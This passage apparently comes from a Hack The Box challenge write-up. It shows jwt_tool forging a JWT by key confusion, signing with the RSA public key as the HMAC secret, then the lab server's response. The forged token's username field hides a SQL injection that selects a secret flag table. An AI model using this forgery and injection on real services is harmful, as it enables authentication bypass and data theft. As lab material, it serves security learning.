jwttool_6ba233cd46f63d92c9a15ca8503affe0 - EXPLOIT: Key-Confusion attack (signing using the Public Key as the HMAC secret)
(This will only be valid on unpatched implementations of JWT.)                                                                                                                                                                               
[+] eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3R0ZXN0JyB1bmlvbiBzZWxlY3QgbnVsbCwoU0VMRUNUIHRvcF9zZWNyZXRfZmxhYWcgRlJPTSBmbGFnX3N0b3JhZ2UpLG51bGw7LS0iLCJwayI6Ii0tLS0tQkVHSU4gUFVCTElDIEtFWS0tLS0tXG5NSUlCSWpBTkJna3Foa2lHOXcwQkFRRUZBQU9DQVE4QU1JSUJDZ0tDQVFFQTk1b1RtOUROemNIcjhnTGhqWmFZXG5rdHNiajFLeHhVT296dzB0clA5M0JnSXBYdjZXaXBRUkI1bHFvZlBsVTZGQjk5SmM1UVowNDU5dDczZ2dWRFFpXG5YdUNNSTJob1VmSjFWbWpOZVdDclNyRFVob2tJRlpFdUN1bWVod3d0VU51RXYwZXpDNTRaVGRFQzVZU1RBT3pnXG5qSVdhbHNIai9nYTVaRUR4M0V4dDBNaDVBRXdiQUQ3MytxWFMvdUN2aGZhamdwekhHZDlPZ05RVTYwTE1mMm1IXG4rRnluTnNqTk53bzVuUmU3dFIxMldiMllPQ3h3MnZkYW1PMW4xa2YvU015cFNLS3ZPZ2o1eTBMR2lVM2plWE14XG5WOFdTK1lpWUNVNU9CQW1UY3oydzJrekJoWkZsSDZSSzRtcXVleEpIcmEyM0lHdjVVSjVHVlBFWHBkQ3FLM1RyXG4wd0lEQVFBQlxuLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tXG4iLCJpYXQiOjE2MjQwODcyOTd9.hUyD25gzhCVN7-njqYhRFWrKREEMi3t5pf5ofisxjgQ
```

```bash
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 2543
ETag: W/"9ef-Y5jmNet/QCZsx08Qtj+kn8iN8lU"
Date: Sat, 19 Jun 2021 08:18:12 GMT
Connection: close

<!DOCTYPE html>
<html lang="en">
<head>

                <div class="card-header text-white bg-danger">
                    Message from developers
                </div>
                <div class="card-body">
                    Welcome HTB{}<br>
                    This site is under development. <br>
                    Please come back later
```